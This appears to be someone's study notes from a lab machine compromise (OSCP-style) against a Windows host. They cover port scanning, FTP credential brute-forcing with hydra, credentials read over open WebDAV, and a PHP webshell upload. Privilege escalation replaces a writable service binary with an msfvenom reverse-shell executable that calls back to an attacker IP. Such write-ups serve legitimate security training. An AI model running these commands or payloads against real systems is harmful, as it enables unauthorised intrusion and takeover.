### Enumeration
```
IP=192.168.247.127
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p135,139,445,3306,5040,7680,8000,30021,33033,44330,45332,45443,49664,49665,49666,49667,49668,49669 -A $IP
```
### Ports 
- 135
	- RPC
- 139
	- RPC
- 445
	- microsoft-ds
- 3306
	- mysql
- 5040
	- unknown
- 7680
	- pando-pub
- 8000
	- BarracudaServer.com (Windows)
- 30021
	- FileZilla ftpd 0.9.41 beta
- 33033
	- unknown
- 44330
	- unknown
- 45332
	- Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
- 45443
	- Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
- 49664
	- RPC
- 49665
	- RPC
- 49666
	- RPC
- 49667
	- RPC
- 49668
	- RPC
- 49669
	- RPC
### Foothold
- 30021
	- ftp anonymous@$IP
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
- RPC/ SMB
	- enum4linux -U $IP
		- nothing
- 445
	- smbclient -N -L //$IP
		- access denied
	- nmap --script smb-vuln* -p135,139,445 $IP
		- not vulnerable
- 8000
	- Default landing page
		- ![[Pasted image 20240712141132.png]]
	- Versions
		- Webdav
	- Webdav
		- http://192.168.247.127:8000/fs/C/xampp/passwords.txt
			- xampp-dav-unsecure:ppmax2011
			- mysql - root:NO PASSWORD
		- http://192.168.247.127:8000/fs/C/xampp/htdocs/
			- is the root directory for 45332
			- Uploaded webshell.php
			- ![[Pasted image 20240712141913.png]]
			- Now we have shell commands
			- Used base64 PS1
	- Directory Brute force
		- dirsearch -u http://$IP
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
- 45332
	- ![[Pasted image 20240712141500.png]]
### PE
#### Windows
- jerren
	- whoami /all
		- SeChangeNotifyPrivilege enable
	- net user USERNAME
		- nothing
	- systeminfo
		- windows 10 pro x64
		- 10.0.19042 N/A Build 19042
	- history
		- (Get-PSReadLineOption).HistorySavePath
			- type PATH
		- nothing
	- Users with console
		- Administrator
		- guest 
		- jerren
	- Unquoted
		- cmd
			- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
		- PS1
			- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
				- `bd  "C:\bd\bd.exe"
				- can edit bd.exe
				- Can't start, stop bd service
				- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.195 LPORT=22 -f exe > bd.exe
				- Then moved in replace of bd.exe
				- shutdown -r
				- We get a rev shell as nt auth
		- icacls Filepath before .exe
			- Looking for W or F
	- /
		- bd
		- FTP
		- Sites
		- xampp
		- RailsInstaller
		- Ruby26-x64
	- winpeas
### Credentials
### Lessons Learned
- See an exploit path. Just try it. 